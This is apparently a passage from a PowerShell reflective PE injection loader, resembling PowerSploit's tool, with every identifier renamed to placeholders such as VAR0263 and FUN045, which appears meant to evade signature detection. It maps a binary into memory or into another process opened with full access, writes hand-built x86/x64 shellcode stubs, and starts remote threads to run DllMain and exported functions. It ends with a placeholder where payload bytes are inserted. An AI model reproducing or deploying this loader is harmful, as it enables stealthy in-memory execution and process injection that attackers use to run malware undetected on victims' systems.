                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
                }
                $VAR0279 = $VAR0263
            }

            [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONST033)
            if ($VAR0263 -eq [IntPtr]::Zero) {
                Throw "ERROR58."
            }
            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0263, $VAR0126.CONST034) | Out-Null


            
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST038 -Value $VAR0128
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST039 -Value $VAR0279
            

            FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010


            
            FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010


            
            if ($VAR0210 -eq $true) {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
            }
            else {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
            }


            
            if ($VAR0210 -eq $false) {
                if ($VAR0273 -eq $true) {

                    FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                }
                
            }
            


            
            if ($VAR0210 -eq $true) {
                [UInt32]$VAR0167 = 0
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.CONST033), [Ref]$VAR0167)
                if ($Success -eq $false) {
                    Throw "ERROR59"
                }
            }


            
            if ($VAR0126.CONST037 -ieq "Library") {
                if ($VAR0210 -eq $false) {

                    $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
                    $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                    $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)

                    $VAR0282.Invoke($VAR0126.VAR0263, 1, [IntPtr]::Zero) | Out-Null
                }
                else {
                    $VAR0280 = FUN005 ($VAR0279) ($VAR0126.CONST031.CONST122.CONST060)

                    if ($VAR0126.CONST032 -eq $true) {
                        
                        $VAR0283 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                        $VAR0285 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                    }
                    else {
                        
                        $VAR0283 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                        $VAR0285 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                    }
                    $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
                    $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                    $VAR0173 = $VAR0172

                    FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0283.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0279, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0284.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0280, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0285.Length)

                    $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
                    if ($VAR0178 -eq [IntPtr]::Zero) {
                        Throw "ERROR60"
                    }

                    $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
                    if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                        Throw "ERROR61"
                    }

                    $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                    $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                    if ($VAR0144 -ne 0) {
                        Throw "ERROR62"
                    }

                    $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                }
            }
            elseif ($VAR0126.CONST037 -ieq "Executable") {
                
                [IntPtr]$VAR0228 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0228, 0, 0x00)
                $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228

                
                
                [IntPtr]$VAR0287 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
                
                $VAR0042.FUN056.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $VAR0287, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

                while ($true) {
                    [Byte]$VAR0288 = [System.Runtime.InteropServices.Marshal]::ReadByte($VAR0228, 0)
                    if ($VAR0288 -eq 1) {
                        FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                        break
                    }
                    else {
                        Start-Sleep -Seconds 1
                    }
                }
            }

            return @($VAR0126.VAR0263, $VAR0279)
        }


        Function FUN029 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263
            )

            
            $VAR0041 = FUN002
            $VAR0042 = FUN003
            $VAR010 = FUN001

            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041

            
            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)

                while ($true) {
                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)

                    
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
                        break
                    }

                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name)))
                    $VAR0213 = $VAR0042.FUN041.Invoke($VAR0164)

                    

                    $Success = $VAR0042.FUN042.Invoke($VAR0213)
                    

                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                }
            }

            
            $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
            $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
            $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)

            $VAR0282.Invoke($VAR0126.VAR0263, 0, [IntPtr]::Zero) | Out-Null


            $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
            
        }


        Function FUN030 {
            $VAR0042 = FUN003
            $VAR010 = FUN001
            $VAR0041 = FUN002

            $VAR0161 = [IntPtr]::Zero

            
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
                Throw "ERROR64"
            }
            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
                $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction SilentlyContinue)
                if ($VAR0289.Count -eq 0) {
                    Throw "ERROR65 $VAR006"
                }
                elseif ($VAR0289.Count -gt 1) {
                    $VAR0290 = Get-Process | Where-Object { $_.Name -eq $VAR006 } | Select-Object ProcessName, Id, SessionId
                    Write-Output $VAR0290
                    Throw "ERROR66 $VAR006"
                }
                else {
                    $VAR005 = $VAR0289[0].ID
                }
            }

            
            
            
            
            
            
            

            if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
                $VAR0161 = $VAR0042.FUN043.Invoke(0x001F0FFF, $false, $VAR005)
                if ($VAR0161 -eq [IntPtr]::Zero) {
                    Throw "ERROR67: $VAR005"
                }

            }


            
            $VAR0263 = [IntPtr]::Zero
            if ($VAR0161 -eq [IntPtr]::Zero) {
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
            }
            else {
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
            }
            if ($VAR0291 -eq [IntPtr]::Zero) {
                Throw "ERROR68"
            }

            $VAR0263 = $VAR0291[0]
            $VAR0292 = $VAR0291[1] 


            
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
            if (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -eq [IntPtr]::Zero)) {
                
                
                
                switch ($VAR003) {
                    'WideStr' {
                        
                        [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName "WideStrFunc"
                        if ($VAR0293 -eq [IntPtr]::Zero) {
                            Throw "ERROR67"
                        }
                        $VAR0294 = FUN011 @() ([IntPtr])
                        $VAR0295 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0293, $VAR0294)
                        [IntPtr]$VAR0296 = $VAR0295.Invoke()
                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($VAR0296)
                        Write-Output $VAR0297
                    }

                    'Str' {

                        [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName "StringFunc"
                        if ($VAR0298 -eq [IntPtr]::Zero) {
                            Throw "ERROR68"
                        }
                        $VAR0299 = FUN011 @() ([IntPtr])
                        $VAR0300 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0298, $VAR0299)
                        [IntPtr]$VAR0296 = $VAR0300.Invoke()
                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0296)
                        Write-Output $VAR0297
                    }

                    'NoOutput' {
                        [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
                        if ($VAR0301 -eq [IntPtr]::Zero) {
                            Throw "ERROR69"
                        }
                        $VAR0302 = FUN011 @() ([Void])
                        $VAR0303 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0301, $VAR0302)
                        $VAR0303.Invoke() | Out-Null
                    }
                    'DefaultSettings' {
                        Write-Verbose "ERROR70"
                    }
                }
                
                
                
            }
            
            elseif (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -ne [IntPtr]::Zero)) {
                $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
                if (($VAR0301 -eq $null) -or ($VAR0301 -eq [IntPtr]::Zero)) {
                    Throw "ERROR71"
                }

                $VAR0301 = FUN004 $VAR0301 $VAR0263
                $VAR0301 = FUN005 $VAR0301 $VAR0292

                
                $Null = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
            }

            
            
            if ($VAR0161 -eq [IntPtr]::Zero -and $VAR0126.CONST037 -ieq "Library") {
                FUN029 -VAR0263 $VAR0263
            }
            else {
                
                $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
                
            }

        }

        FUN030
    }

    
    Function FUN030 {
        


        if (-not $VAR008) {
            
            
            $VAR001[0] = 0
            $VAR001[1] = 0
        }

        
        if ($VAR004 -ne $null -and $VAR004 -ne '') {
            $VAR004 = "VAR0305 $VAR004"
        }
        else {
            $VAR004 = "VAR0305"
        }

        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
        }
        else {
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
        }
    }

    FUN030
}

$Bytes = QWERQWERQWER
FUN000 -VAR0001 $Bytes

"""